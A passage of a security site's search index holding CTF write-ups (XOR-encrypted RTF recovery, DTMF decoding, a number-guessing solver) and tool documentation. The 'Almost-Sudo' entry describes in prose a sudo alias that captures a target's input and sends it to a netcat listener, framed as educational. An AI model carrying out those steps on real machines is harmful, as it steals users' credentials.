anyways.","title":"Solution"},{"location":"ctfs/own/eko2019/guess_my_number/","text":"Guess my number Description Category: Programming Points: 250/ 500 Goal: Fun, coding and a little bit about probabilties. Statement Let's play a game :). I will pick a number of 5 digits without telling you which one it is. You'll have to guess it in 4 or less attempts. Each attempt you make will have answer. This answer will be two numbers: X Y X is the amount of good digits Y is the amount of regular digits. A good digit means that you have correctly guessed the position of a digit. A regular digit means that a digit of your guess is inside the number that was chosen but is not in the correct place. For example: If the number chosen is 91246 and your attempt is 12345, the answer will be: 1 2. Why? 1 good because the digit 4 is inside the number and also in the correct place 2 regulars because the digits 1 and 2 are in the number, but in diffrent positions than the ones attempted. Good luck ! === Juguemos un juego :) Voy a elegir un n\u00famero de 5 cifras sin dec\u00edrte cual es. Vos vas a tener que adivinarlo en 4 o menos intentos. Cada intento tendr\u00e1 una respuesta. Dicha respuesta estar\u00e1 compuesta por dos n\u00fameros: X Y X ser\u00e1 la cantidad de d\u00edgitos que est\u00e1n bien Y ser\u00e1 la cantidad de d\u00edgitos que est\u00e1n regular Por ejemplo: Si el n\u00famero elegido es 91246 y tu intento es 12345, la respuesta ser\u00e1: 1 2. \u00bfPor qu\u00e9? 1 bien porque el d\u00edgito 4 est\u00e1 dentro del n\u00famero elegido y adem\u00e1s en la posici\u00f3n correcta. 2 regulares porque los d\u00edgitos 1 y 2 est\u00e1n dentro del n\u00famero pero en posiciones incorrectas. Buena suerte! nc 198.211.123.92 1337 File This was hosted in a particular server which may not be available for ever. Therefore, here is the actual server-side code. server side code Solution I used to play this game when I was younger and I always found it very funny. The idea here wasn't to hack anything but rather create a real solver for this game, which shouldn't take too much time. The server had some constraints like: The socket has 10 seconds of timeout You cannot have more than 10 connections from the same IP You have only 4 attempts to guess the number, otherwise the connection is closed. Each time a new connection is performed, a new random number of 5 digits is selected. Each time an attempt was submitted, the server will perform a 5 seconds sleep. Maximun amount of valid/invalid attempts is 100! My idea was to force as much as possible, to develop their own solvers. Trying to bypass all of these constraints. There is not much to say in this challenge but some tricks that I thought at the moment of solving it: Do to the timeout is 10 seconds if you have to process something that may take to more than that, you can just send an \"invalid format\" message. Therefore you will not waste a valid attempt one, but you will be \"refreshing\" the timeout. However, be you should do this carefully because you have also a limitation of 100 attempts either valid or invalid. Your solution won't guarantee you to always guess the number in 4 or less attempts. But the probability in answering correctly in less than 100 connections with a naive solver, should be high enough. You can split this in 10 processes (10 different connections at a time) and therefore speed up your chances of winning. Here is the solver I've developed. Finally the flag was: ONA{861c4f67e887dec85292d36ab05cd7a1a7275228}","title":"Guess my number"},{"location":"ctfs/own/eko2019/guess_my_number/#guess-my-number","text":"","title":"Guess my number"},{"location":"ctfs/own/eko2019/guess_my_number/#description","text":"Category: Programming Points: 250/ 500 Goal: Fun, coding and a little bit about probabilties.","title":"Description"},{"location":"ctfs/own/eko2019/guess_my_number/#statement","text":"Let's play a game :). I will pick a number of 5 digits without telling you which one it is. You'll have to guess it in 4 or less attempts. Each attempt you make will have answer. This answer will be two numbers: X Y X is the amount of good digits Y is the amount of regular digits. A good digit means that you have correctly guessed the position of a digit. A regular digit means that a digit of your guess is inside the number that was chosen but is not in the correct place. For example: If the number chosen is 91246 and your attempt is 12345, the answer will be: 1 2. Why? 1 good because the digit 4 is inside the number and also in the correct place 2 regulars because the digits 1 and 2 are in the number, but in diffrent positions than the ones attempted. Good luck ! === Juguemos un juego :) Voy a elegir un n\u00famero de 5 cifras sin dec\u00edrte cual es. Vos vas a tener que adivinarlo en 4 o menos intentos. Cada intento tendr\u00e1 una respuesta. Dicha respuesta estar\u00e1 compuesta por dos n\u00fameros: X Y X ser\u00e1 la cantidad de d\u00edgitos que est\u00e1n bien Y ser\u00e1 la cantidad de d\u00edgitos que est\u00e1n regular Por ejemplo: Si el n\u00famero elegido es 91246 y tu intento es 12345, la respuesta ser\u00e1: 1 2. \u00bfPor qu\u00e9? 1 bien porque el d\u00edgito 4 est\u00e1 dentro del n\u00famero elegido y adem\u00e1s en la posici\u00f3n correcta. 2 regulares porque los d\u00edgitos 1 y 2 est\u00e1n dentro del n\u00famero pero en posiciones incorrectas. Buena suerte! nc 198.211.123.92 1337","title":"Statement"},{"location":"ctfs/own/eko2019/guess_my_number/#file","text":"This was hosted in a particular server which may not be available for ever. Therefore, here is the actual server-side code. server side code","title":"File"},{"location":"ctfs/own/eko2019/guess_my_number/#solution","text":"I used to play this game when I was younger and I always found it very funny. The idea here wasn't to hack anything but rather create a real solver for this game, which shouldn't take too much time. The server had some constraints like: The socket has 10 seconds of timeout You cannot have more than 10 connections from the same IP You have only 4 attempts to guess the number, otherwise the connection is closed. Each time a new connection is performed, a new random number of 5 digits is selected. Each time an attempt was submitted, the server will perform a 5 seconds sleep. Maximun amount of valid/invalid attempts is 100! My idea was to force as much as possible, to develop their own solvers. Trying to bypass all of these constraints. There is not much to say in this challenge but some tricks that I thought at the moment of solving it: Do to the timeout is 10 seconds if you have to process something that may take to more than that, you can just send an \"invalid format\" message. Therefore you will not waste a valid attempt one, but you will be \"refreshing\" the timeout. However, be you should do this carefully because you have also a limitation of 100 attempts either valid or invalid. Your solution won't guarantee you to always guess the number in 4 or less attempts. But the probability in answering correctly in less than 100 connections with a naive solver, should be high enough. You can split this in 10 processes (10 different connections at a time) and therefore speed up your chances of winning. Here is the solver I've developed. Finally the flag was: ONA{861c4f67e887dec85292d36ab05cd7a1a7275228}","title":"Solution"},{"location":"ctfs/own/eko2019/rich_text/","text":"The Rich Text Description Category: Cryptography Points: 150 / 500 Goal: Understand the risks of XORing Statement A student has encrypted a file with a really powerful technique (according to him). Can you decrypt it? ==== Un estudiante cifr\u00f3 un archivo con una poderosa t\u00e9cnica (seg\u00fan \u00e9l). Pod\u00e9s decifrarlo? File encrypted text Solution The very first part of this challenge aimed to play with a little bit of deduction from \"metainformation\". In other words: You've been provided with an encrypted file and nothing else. The amount of points of this challenge isn't high, meaning that the technique should be something easy. Quote from the statement: \"[..] with a powerful technique (according to him) [...] \" What is the most common technique that usually people think is really good for encrypting data but almost always fails to work? And also this technique should be known by any student? Yes! The answer is XOR. Now, even if we know that a XOR was used, we need to know against what was XORed to try to recover the information. From where else can we get some data.. Maybe from the title of the challenge? \"The Rich text\" ? After some googling , the first finding talks about a very well known file format ( .rtf ). So at this point, we can think that we know the format of the file that was XORed. If we know the format, means that we know some information of the file, in particular, most formats have what are called magic bytes that should be present always. The magic bytes of .rtf are: 7B 5C 72 74 66 31 or in ascii: {\\rtf1 . These should be the first 6 bytes of our result. Doing some math: plain_text \u2295 key = cipher_text plain_text = cipher_text \u2295 key plain_text \u2295 cipher_text = key We don't actually know the length of the key, but we can try to XOR the first 6 bytes (length of .rtf magic bytes) of the cipher_text against the magic bytes to get the first 6 bytes of the key: xxd -l 6 text.enc 00000000: aa59 4264 7f51 .YBd.Q Then, I used the following tiny python3 script: import binascii cipher_text = b\"\\xaa\\x59\\x42\\x64\\x7f\\x51\" magic_bytes = b\"\\x7b\\x5c\\x72\\x74\\x66\\x31\" result = bytearray() for i in range(6): result.append(cipher_text[i] ^ magic_bytes[i]) print(binascii.hexlify(result)) The answer was: b'd10530101960'. Which means that the first 6 bytes of our key are: D1 05 30 10 19 60 . Now, lets try to XOR the ciphertext against the key (key with 6 bytes) and see if we can get an interesting (or potentially all) part of the plain text (as step 2. in math part stated). For this I used almost the same python3 script but adapted: import sys cipher_text = bytearray(open(sys.argv[1], 'rb').read()) key = b\"\\xd1\\x05\\x30\\x10\\x19\\x60\" result = bytearray() for i in range(len(cipher_text)): result.append(cipher_text[i] ^ key[i%len(key)]) open(\"output.rtf\", 'wb').write(result) If we run this script a file output.rtf will appear. Luckily this file is the complete .rtf file and we can get the flag in plain text from there: cat output.rtf {\\rtf1\\ansi\\deff3\\adeflang1025 {\\fonttbl{\\f0\\froman\\fprq2\\fcharset0 Times New Roman;}{\\f1\\froman\\fprq2\\fcharset2 Symbol;}{\\f2\\fswiss\\fprq2\\fcharset0 Arial;}{\\f3\\froman\\fprq2\\fcharset0 Liberation Serif{\\*\\falt Times New Roman};}{\\f4\\fswiss\\fprq2\\fcharset0 Liberation Sans{\\*\\falt Arial};}{\\f5\\fnil\\fprq2\\fcharset0 Noto Sans CJK SC Regular;}{\\f6\\fnil\\fprq2\\fcharset0 FreeSans;}{\\f7\\fswiss\\fprq0\\fcharset0 FreeSans;}} {\\colortbl;\\red0\\green0\\blue0;\\red0\\green0\\blue255;\\red0\\green255\\blue255;\\red0\\green255\\blue0;\\red255\\green0\\blue255;\\red255\\green0\\blue0;\\red255\\green255\\blue0;\\red255\\green255\\blue255;\\red0\\green0\\blue128;\\red0\\green128\\blue128;\\red0\\green128\\blue0;\\red128\\green0\\blue128;\\red128\\green0\\blue0;\\red128\\green128\\blue0;\\red128\\green128\\blue128;\\red192\\green192\\blue192;} {\\stylesheet{\\s0\\snext0\\widctlpar\\hyphpar0\\aspalpha\\ltrpar\\cf0\\kerning1\\dbch\\af5\\langfe2052\\dbch\\af6\\afs24\\alang1081\\loch\\f3\\fs24\\lang1033 Normal;} {\\s15\\sbasedon0\\snext16\\sb240\\sa120\\keepn\\dbch\\af5\\dbch\\af6\\afs28\\loch\\f4\\fs28 Heading;} {\\s16\\sbasedon0\\snext16\\sl288\\slmult1\\sb0\\sa140 Text Body;} {\\s17\\sbasedon16\\snext17\\sl288\\slmult1\\sb0\\sa140\\dbch\\af7 List;} {\\s18\\sbasedon0\\snext18\\sb120\\sa120\\noline\\i\\dbch\\af7\\afs24\\ai\\fs24 Caption;} {\\s19\\sbasedon0\\snext19\\noline\\dbch\\af7 Index;} }{\\*\\generator LibreOffice/5.1.6.2$Linux_X86_64 LibreOffice_project/10m0$Build-2}{\\info{\\creatim\\yr2019\\mo9\\dy10\\hr11\\min5}{\\revtim\\yr2019\\mo9\\dy10\\hr11\\min6}{\\printim\\yr0\\mo0\\dy0\\hr0\\min0}}\\deftab709 \\viewscale100 {\\*\\pgdsctbl {\\pgdsc0\\pgdscuse451\\pgwsxn12240\\pghsxn15840\\marglsxn1134\\margrsxn1134\\margtsxn1134\\margbsxn1134\\pgdscnxt0 Default Style;}} \\formshade\\paperh15840\\paperw12240\\margl1134\\margr1134\\margt1134\\margb1134\\sectd\\sbknone\\sectunlocked1\\pgndec\\pgwsxn12240\\pghsxn15840\\marglsxn1134\\margrsxn1134\\margtsxn1134\\margbsxn1134\\ftnbj\\ftnstart1\\ftnrstcont\\ftnnar\\aenddoc\\aftnrstcont\\aftnstart1\\aftnnrlc {\\*\\ftnsep\\chftnsep}\\pgndec\\pard\\plain \\s0\\widctlpar\\hyphpar0\\aspalpha\\ltrpar\\cf0\\kerning1\\dbch\\af5\\langfe2052\\dbch\\af6\\afs24\\alang1081\\loch\\f3\\fs24\\lang1033{\\rtlch \\ltrch\\loch The flag is: ONA\\{b06901c39072abf000563ea92968cbf93b26d4d4\\}} \\par }% Therefore, the flag was ONA{b06901c39072abf000563ea92968cbf93b26d4d4}","title":"The Rich Text"},{"location":"ctfs/own/eko2019/rich_text/#the-rich-text","text":"","title":"The Rich Text"},{"location":"ctfs/own/eko2019/rich_text/#description","text":"Category: Cryptography Points: 150 / 500 Goal: Understand the risks of XORing","title":"Description"},{"location":"ctfs/own/eko2019/rich_text/#statement","text":"A student has encrypted a file with a really powerful technique (according to him). Can you decrypt it? ==== Un estudiante cifr\u00f3 un archivo con una poderosa t\u00e9cnica (seg\u00fan \u00e9l). Pod\u00e9s decifrarlo?","title":"Statement"},{"location":"ctfs/own/eko2019/rich_text/#file","text":"encrypted text","title":"File"},{"location":"ctfs/own/eko2019/rich_text/#solution","text":"The very first part of this challenge aimed to play with a little bit of deduction from \"metainformation\". In other words: You've been provided with an encrypted file and nothing else. The amount of points of this challenge isn't high, meaning that the technique should be something easy. Quote from the statement: \"[..] with a powerful technique (according to him) [...] \" What is the most common technique that usually people think is really good for encrypting data but almost always fails to work? And also this technique should be known by any student? Yes! The answer is XOR. Now, even if we know that a XOR was used, we need to know against what was XORed to try to recover the information. From where else can we get some data.. Maybe from the title of the challenge? \"The Rich text\" ? After some googling , the first finding talks about a very well known file format ( .rtf ). So at this point, we can think that we know the format of the file that was XORed. If we know the format, means that we know some information of the file, in particular, most formats have what are called magic bytes that should be present always. The magic bytes of .rtf are: 7B 5C 72 74 66 31 or in ascii: {\\rtf1 . These should be the first 6 bytes of our result. Doing some math: plain_text \u2295 key = cipher_text plain_text = cipher_text \u2295 key plain_text \u2295 cipher_text = key We don't actually know the length of the key, but we can try to XOR the first 6 bytes (length of .rtf magic bytes) of the cipher_text against the magic bytes to get the first 6 bytes of the key: xxd -l 6 text.enc 00000000: aa59 4264 7f51 .YBd.Q Then, I used the following tiny python3 script: import binascii cipher_text = b\"\\xaa\\x59\\x42\\x64\\x7f\\x51\" magic_bytes = b\"\\x7b\\x5c\\x72\\x74\\x66\\x31\" result = bytearray() for i in range(6): result.append(cipher_text[i] ^ magic_bytes[i]) print(binascii.hexlify(result)) The answer was: b'd10530101960'. Which means that the first 6 bytes of our key are: D1 05 30 10 19 60 . Now, lets try to XOR the ciphertext against the key (key with 6 bytes) and see if we can get an interesting (or potentially all) part of the plain text (as step 2. in math part stated). For this I used almost the same python3 script but adapted: import sys cipher_text = bytearray(open(sys.argv[1], 'rb').read()) key = b\"\\xd1\\x05\\x30\\x10\\x19\\x60\" result = bytearray() for i in range(len(cipher_text)): result.append(cipher_text[i] ^ key[i%len(key)]) open(\"output.rtf\", 'wb').write(result) If we run this script a file output.rtf will appear. Luckily this file is the complete .rtf file and we can get the flag in plain text from there: cat output.rtf {\\rtf1\\ansi\\deff3\\adeflang1025 {\\fonttbl{\\f0\\froman\\fprq2\\fcharset0 Times New Roman;}{\\f1\\froman\\fprq2\\fcharset2 Symbol;}{\\f2\\fswiss\\fprq2\\fcharset0 Arial;}{\\f3\\froman\\fprq2\\fcharset0 Liberation Serif{\\*\\falt Times New Roman};}{\\f4\\fswiss\\fprq2\\fcharset0 Liberation Sans{\\*\\falt Arial};}{\\f5\\fnil\\fprq2\\fcharset0 Noto Sans CJK SC Regular;}{\\f6\\fnil\\fprq2\\fcharset0 FreeSans;}{\\f7\\fswiss\\fprq0\\fcharset0 FreeSans;}} {\\colortbl;\\red0\\green0\\blue0;\\red0\\green0\\blue255;\\red0\\green255\\blue255;\\red0\\green255\\blue0;\\red255\\green0\\blue255;\\red255\\green0\\blue0;\\red255\\green255\\blue0;\\red255\\green255\\blue255;\\red0\\green0\\blue128;\\red0\\green128\\blue128;\\red0\\green128\\blue0;\\red128\\green0\\blue128;\\red128\\green0\\blue0;\\red128\\green128\\blue0;\\red128\\green128\\blue128;\\red192\\green192\\blue192;} {\\stylesheet{\\s0\\snext0\\widctlpar\\hyphpar0\\aspalpha\\ltrpar\\cf0\\kerning1\\dbch\\af5\\langfe2052\\dbch\\af6\\afs24\\alang1081\\loch\\f3\\fs24\\lang1033 Normal;} {\\s15\\sbasedon0\\snext16\\sb240\\sa120\\keepn\\dbch\\af5\\dbch\\af6\\afs28\\loch\\f4\\fs28 Heading;} {\\s16\\sbasedon0\\snext16\\sl288\\slmult1\\sb0\\sa140 Text Body;} {\\s17\\sbasedon16\\snext17\\sl288\\slmult1\\sb0\\sa140\\dbch\\af7 List;} {\\s18\\sbasedon0\\snext18\\sb120\\sa120\\noline\\i\\dbch\\af7\\afs24\\ai\\fs24 Caption;} {\\s19\\sbasedon0\\snext19\\noline\\dbch\\af7 Index;} }{\\*\\generator LibreOffice/5.1.6.2$Linux_X86_64 LibreOffice_project/10m0$Build-2}{\\info{\\creatim\\yr2019\\mo9\\dy10\\hr11\\min5}{\\revtim\\yr2019\\mo9\\dy10\\hr11\\min6}{\\printim\\yr0\\mo0\\dy0\\hr0\\min0}}\\deftab709 \\viewscale100 {\\*\\pgdsctbl {\\pgdsc0\\pgdscuse451\\pgwsxn12240\\pghsxn15840\\marglsxn1134\\margrsxn1134\\margtsxn1134\\margbsxn1134\\pgdscnxt0 Default Style;}} \\formshade\\paperh15840\\paperw12240\\margl1134\\margr1134\\margt1134\\margb1134\\sectd\\sbknone\\sectunlocked1\\pgndec\\pgwsxn12240\\pghsxn15840\\marglsxn1134\\margrsxn1134\\margtsxn1134\\margbsxn1134\\ftnbj\\ftnstart1\\ftnrstcont\\ftnnar\\aenddoc\\aftnrstcont\\aftnstart1\\aftnnrlc {\\*\\ftnsep\\chftnsep}\\pgndec\\pard\\plain \\s0\\widctlpar\\hyphpar0\\aspalpha\\ltrpar\\cf0\\kerning1\\dbch\\af5\\langfe2052\\dbch\\af6\\afs24\\alang1081\\loch\\f3\\fs24\\lang1033{\\rtlch \\ltrch\\loch The flag is: ONA\\{b06901c39072abf000563ea92968cbf93b26d4d4\\}} \\par }% Therefore, the flag was ONA{b06901c39072abf000563ea92968cbf93b26d4d4}","title":"Solution"},{"location":"ctfs/own/eko2019/secret_spy_message/","text":"Secret Spy Message Description Category: Steganography Points: 100 / 500 Goal: Fun and learn about DTMF Statement Our secret spy has recorded something that seems useful but we don't know how! Can you help us? The flag is: ONA{sha1(password)} ==== Nuestro esp\u00eda secreto grab\u00f3 algo que parece ser \u00fatil pero no sabemos c\u00f3mo utilizarlo! Nos ayud\u00e1s? El flag es: ONA{sha1(password)} File audio.wav Solution This challenge was built with the goal of having some fun. It didn't require knowledge but just a little bit of googling and the correct tools. The file provided is a .wav file (audio) with some noises. If you listen for a couple of secs the audio you'll notice that sound is familiar. Seems to be the sound made by a phone when you're dialing. It could be possible to know what was dialed? Well, this sound is not other than the signal being sent through the telecommunication channel. With some googling you can find that this type of encoding is called DTMF. So now we have an audio of DTMF tones that we want to decode (we want to get the key that was pressed from its sound). The following table can be found in this link : It depicts the combination of frequencies for each of the different numbers. Therefore, we could analyze the frequency spectrum of the audio with some tool (like Audacity) and match each time a key was pressed with the corresponding frequency to actually get the pressed number. Fortunately, some automatic tools which will do the work for us already exists. The one I used was dtmfcheck for linux. It's not the only one, Audacity has a plugin called phonalyzer that will do the job as well. Otherwise, manual analysis will take longer but still would have been useful. With dtmfcheck we just need to run provide the .wav file as input: Analyzing the output we will see that we have the numbers that were pressed (just afrter the \"Detected\" string). With the following command line we can extract them without any space between them: dtmfcheck audio_espia.wav | awk -F Detected '{print $2}' | cut -f1 -d '(' | tr -d \"\\n\" | tr -d ' ' Why we put it all of them together? Because the tool is capable of determing which keys were pressed but sometimes the pause between them may cause issues. For example: if the serie 777777 was dialed, it wouldn't be possible to distinguish between 77 , 7777 and 777 , 777 (which, as we are gonna see later, are different things). In order to solve that we should carefully listen again the audio and create insert the pauses manually where they are. Once this action is carried out, we end up with the following message: 8 44 33 7 2 7777 7777 9 666 777 3 444 7777 6 666 66 55 33 999 7777 2 777 33 222 666 666 555 444 333 999 666 88 4 444 888 33 8 44 33 6 22 2 66 2 66 2 7777 Taking into account that it should be a message, and that a phone was used, it is possible to deduce that it was written as SMS in older phones used to do. Again, some googling and using a very well known page for encoding/encryption algorithms ( dcode ), we find out that we have a way to \"\"\"decrypt\"\"\" it (called Multi-tap Cipher (SMS Mode ABC) ). After decryption we get: the string: THEPASSWORDISMONKEYSARECOOLIFYOUGIVETHEMBANANAS Due to the format of the flag requires the \"ONA{}\" the final answer is: ONA{8cce9ae2618ea9aff3a00f90c99e570842c528e9}","title":"Secret Spy Message"},{"location":"ctfs/own/eko2019/secret_spy_message/#secret-spy-message","text":"","title":"Secret Spy Message"},{"location":"ctfs/own/eko2019/secret_spy_message/#description","text":"Category: Steganography Points: 100 / 500 Goal: Fun and learn about DTMF","title":"Description"},{"location":"ctfs/own/eko2019/secret_spy_message/#statement","text":"Our secret spy has recorded something that seems useful but we don't know how! Can you help us? The flag is: ONA{sha1(password)} ==== Nuestro esp\u00eda secreto grab\u00f3 algo que parece ser \u00fatil pero no sabemos c\u00f3mo utilizarlo! Nos ayud\u00e1s? El flag es: ONA{sha1(password)}","title":"Statement"},{"location":"ctfs/own/eko2019/secret_spy_message/#file","text":"audio.wav","title":"File"},{"location":"ctfs/own/eko2019/secret_spy_message/#solution","text":"This challenge was built with the goal of having some fun. It didn't require knowledge but just a little bit of googling and the correct tools. The file provided is a .wav file (audio) with some noises. If you listen for a couple of secs the audio you'll notice that sound is familiar. Seems to be the sound made by a phone when you're dialing. It could be possible to know what was dialed? Well, this sound is not other than the signal being sent through the telecommunication channel. With some googling you can find that this type of encoding is called DTMF. So now we have an audio of DTMF tones that we want to decode (we want to get the key that was pressed from its sound). The following table can be found in this link : It depicts the combination of frequencies for each of the different numbers. Therefore, we could analyze the frequency spectrum of the audio with some tool (like Audacity) and match each time a key was pressed with the corresponding frequency to actually get the pressed number. Fortunately, some automatic tools which will do the work for us already exists. The one I used was dtmfcheck for linux. It's not the only one, Audacity has a plugin called phonalyzer that will do the job as well. Otherwise, manual analysis will take longer but still would have been useful. With dtmfcheck we just need to run provide the .wav file as input: Analyzing the output we will see that we have the numbers that were pressed (just afrter the \"Detected\" string). With the following command line we can extract them without any space between them: dtmfcheck audio_espia.wav | awk -F Detected '{print $2}' | cut -f1 -d '(' | tr -d \"\\n\" | tr -d ' ' Why we put it all of them together? Because the tool is capable of determing which keys were pressed but sometimes the pause between them may cause issues. For example: if the serie 777777 was dialed, it wouldn't be possible to distinguish between 77 , 7777 and 777 , 777 (which, as we are gonna see later, are different things). In order to solve that we should carefully listen again the audio and create insert the pauses manually where they are. Once this action is carried out, we end up with the following message: 8 44 33 7 2 7777 7777 9 666 777 3 444 7777 6 666 66 55 33 999 7777 2 777 33 222 666 666 555 444 333 999 666 88 4 444 888 33 8 44 33 6 22 2 66 2 66 2 7777 Taking into account that it should be a message, and that a phone was used, it is possible to deduce that it was written as SMS in older phones used to do. Again, some googling and using a very well known page for encoding/encryption algorithms ( dcode ), we find out that we have a way to \"\"\"decrypt\"\"\" it (called Multi-tap Cipher (SMS Mode ABC) ). After decryption we get: the string: THEPASSWORDISMONKEYSARECOOLIFYOUGIVETHEMBANANAS Due to the format of the flag requires the \"ONA{}\" the final answer is: ONA{8cce9ae2618ea9aff3a00f90c99e570842c528e9}","title":"Solution"},{"location":"etw/introduction/","text":"Coming Soon..","title":"Introduction"},{"location":"etw/introduction/#coming-soon","text":"","title":"Coming Soon.."},{"location":"tiny_tools/almost_sudo/","text":"Almost-Sudo Disclaimer This tiny script which performs an temporary sudo-alias was developed just with awareness and educational intentions. Was tested in Ubuntu environments, using either BASH or ZSH shells. Requirements Access to a user shell (Most likely to a sudoer user) GPG, netcat installed. Network access to shared server. Public PGP-key server in the HTTP Server need to be called \"pentesting_issues.pdf\" (hardcoded) Steps to use it Create a pgp-pair key. Log in to a shared server (between the target and yourself) Set an HTTP-Server hosting the public PGP key at port 6666. (Right know is hardcoded, could be changed, but I don't think is necessary) Set an Netcat-Server receiving connections at port 6667, logging all data received to a file. Run the script providing the ip/host of the shared server, inside the target machine. Connect to the shared server and get the logging file from the NC sever. Decript the file using the private PGP key. Future work Every feedback/help will be very welcome. Delete temp directory. Remove public key from keyring. More.. In depth description The bash script can be found here . In order to ease the explaniation it is divided in different parts: Checks of parameters and more stuff Path and files configurations Getting information required Script creation Creating backup and giving rights to the script to execute Writing in the shellrc (sudo alias) and status variable","title":"Almost sudo"},{"location":"tiny_tools/almost_sudo/#almost-sudo","text":"","title":"Almost-Sudo"},{"location":"tiny_tools/almost_sudo/#disclaimer","text":"This tiny script which performs an temporary sudo-alias was developed just with awareness and educational intentions. Was tested in Ubuntu environments, using either BASH or ZSH shells.","title":"Disclaimer"},{"location":"tiny_tools/almost_sudo/#requirements","text":"Access to a user shell (Most likely to a sudoer user) GPG, netcat installed. Network access to shared server. Public PGP-key server in the HTTP Server need to be called \"pentesting_issues.pdf\" (hardcoded)","title":"Requirements"},{"location":"tiny_tools/almost_sudo/#steps-to-use-it","text":"Create a pgp-pair key. Log in to a shared server (between the target and yourself) Set an HTTP-Server hosting the public PGP key at port 6666. (Right know is hardcoded, could be changed, but I don't think is necessary) Set an Netcat-Server receiving connections at port 6667, logging all data received to a file. Run the script providing the ip/host of the shared server, inside the target machine. Connect to the shared server and get the logging file from the NC sever. Decript the file using the private PGP key.","title":"Steps to use it"},{"location":"tiny_tools/almost_sudo/#future-work","text":"Every feedback/help will be very welcome. Delete temp directory. Remove public key from keyring. More..","title":"Future work"},{"location":"tiny_tools/almost_sudo/#in-depth-description","text":"The bash script can be found here . In order to ease the explaniation it is divided in different parts: Checks of parameters and more stuff Path and files configurations Getting information required Script creation Creating backup and giving rights to the script to execute Writing in the shellrc (sudo alias) and status variable","title":"In depth description"},{"location":"tiny_tools/pastemon/","text":"Pastemon Description Pastemon is a python3-based multiprocess framework aim to allow you monitor the public pastebins that are continuously uploaded to https://pastebin.com. It allows you to match content inside the pastes based on rules written by the user. So far, you are able to match fixed strings or regexes. If some of the rules defined matches, the entire pastebin is stored. Very interesting stuff can be found. Start thining on cool regexes ;). Source code The source code can be found here Requirements Pastemon makes use of the scrapping interface provided by Pastebin. In order to use it, you should whitelist your IP. Therefore, to use Pastemon, you should have a PRO account in Pastebin, otherwise your IP will be blocked after a few seconds. The necessary libraries in order to run this tool, are written down in the requirements.txt . Install To install the tools and necessary libraries, it's recommended to use a particular virtual env: virtualenv pastemon -p python3 source pastemon/bin/activate cd pastemon pip install -r requirements.txt python pastemon.py ARGUMENTS How to use it usage: pastemon.py [-h] [-d DOWNLOADERS] [-g GETTERS] [-a ANALYZERS] [-s STORERS] [-r ANALYSIS_DIR_PATH] [-o OUTPUT_DIR_PATH] [-c CONDITIONS_FILE_PATH] [-t TIME_TO_WAIT] [-n AMOUNT_OF_PASTES_TO_FETCH] optional arguments: -h, --help show this help message and exit -d DOWNLOADERS Amount of downloaders (will download the pastebin content) -g GETTERS Amount of getters (will check for new pastebins) -a ANALYZERS Amount of analyzers (will analyze the pastebins content) -s STORERS Amount of storers (will either store or delete a pastebin) -r ANALYSIS_DIR_PATH Path to store the pastes to be analyzed (temporary) -o OUTPUT_DIR_PATH Path to store the pastes that accomplished some condition -c CONDITIONS_FILE_PATH Path to the YAML conditions file -t TIME_TO_WAIT Amount of time (in secs) to wait between each time it goes for new pastes. Suggested and default (180) -n AMOUNT_OF_PASTES_TO_FETCH Amount of pastes to fetch each time it goes for new pastes. Maximun and default is 250 How does it work If you are interested in the full architecture of the tool, here you'll find a detailed description: As it is depicted in the picture, there are several components involves in the framework: Pastebin Server : This is the only thing that is not controlled by the user. It represents the host where the pastebins are uploaded. Redis : A redis instance with couple of queues to deal with the async between several processes. Storage : This is any storage chosen by the user, used to store each pastebin either temporary or definitively (if it matches some rule). Pastebin Monitor : The actual and initial Python script (pastemon.py) which received the arguments to configure the whole tool. Conditions definition file : A .yaml file where the rules/conditions are defined. Orchestrator : Naive Python object in charge of initializing the rest objects and validating the input. Getters : Python objects in charge of pulling ONLY the new pastes (if there are) and pushing the data related to them (URL, name, etc) to the Pastes data queue . Downloaders : Python objects in charge of pulling the corresponding data of each new pastebin from the pastes data queue , to later download the actual content of each of them. Once the contest is downloaded, it is stored in the Storage (in particular in the Analysis Directory , flag -r ), the related info (path to the storage) is pushed to the Pastes to analyze queue . Analyzers : Python objects in charge of analyzing the actual content (after getting the path from the Pastes to analyze queue ). If there is rule that matches, the path to it togeteher with the action that should be carried out (either store it or delete it) is pushed to the Storers queue . Storers : Python objects in charge of either deleting the patebins that didn't match or moving them in the corresponding directory. For each condition/rule defined a directory, inside the output directory provided as parameter, is created. Defining rules / conditions In order to write new rules/conditions to be matched, a .yaml file with the following structure should be provided: [cond1]: [match_cond_1_1] [match_cond_1_2] ... [cond2]: [match_cond_2_1] [match_cond_2_2] ... ... [condn]: [match_cond_n_1] [match_cond_n_2] ... [condX] : Will be used as the name of the rule/condition, therefore it will exist a directory with this name where all the matched pastebins will be placed. [match_cond_X_Y] : WIll be each of the parts of the condition that are going to be actually checked. The list of possible parameters up to date are: regex : If you want to match some regex. (Only one per condition, can't be used with string in the same condition) string : If you want to match a fixed string. (Only one per condition, can't be used with regex in the same condition) icase : True or False. If True, the match is case insensitive. By default, is False. times : A Natural number. Amount of time that the string/regex should match. By default, 1. Take into account that backslashes \"\\\" must be escaped!!!!! Besides the framework itself, a separate script called tester.py is shipped. This script allows you to manually/quick understand against which conditions/rules a certain \"pastebin\" will match: python tester.py -c test.yaml -p test.pastebin To see a complete example, head to the next section Example python pastemon.py -r analysis -o output -c example.yaml any_gmail_email: regex: \"[^@\\\\s]+@gmail.com\" icase: True my_name: string: \"lmkalg\" icase: True times: 5 my_password: string: \"34syP4ssW0rd1234\" Deeper description: The first condition named \"any_gmail_email\" will match only when the an email of the gmail domain (no matter the case) is present in the pastebin. In positive case, it will store the pastebin inside the output/any_gmail_email/ directory. The second condition named \"my_name\" will match only when the string \"lmkalg\" (no matter the case) is present more than 5 times inside the pastebin. In positive case, it will store the pastebin inside the output/my_name/ directory. The third and last condition named \"my_password\" will match only when the string \"34syP4ssW0rd1234\" appears in the pastebin exactly with the same case each letter. If only one of them differs, the match won't occur. In positive case, it will store the pastebin inside the output/my_password/ directory. Future work Be able to match more than one string/regex in the same condition (near future) Be able to monitor by user. Extend not only to pastebin, but also to another sources.","title":"Pastemon"},{"location":"tiny_tools/pastemon/#pastemon","text":"","title":"Pastemon"},{"location":"tiny_tools/pastemon/#description","text":"Pastemon is a python3-based multiprocess framework aim to allow you monitor the public pastebins that are continuously uploaded to https://pastebin.com. It allows you to match content inside the pastes based on rules written by the user. So far, you are able to match fixed strings or regexes. If some of the rules defined matches, the entire pastebin is stored. Very interesting stuff can be found. Start thining on cool regexes ;).","title":"Description"},{"location":"tiny_tools/pastemon/#source-code","text":"The source code can be found here","title":"Source code"},{"location":"tiny_tools/pastemon/#requirements","text":"Pastemon makes use of the 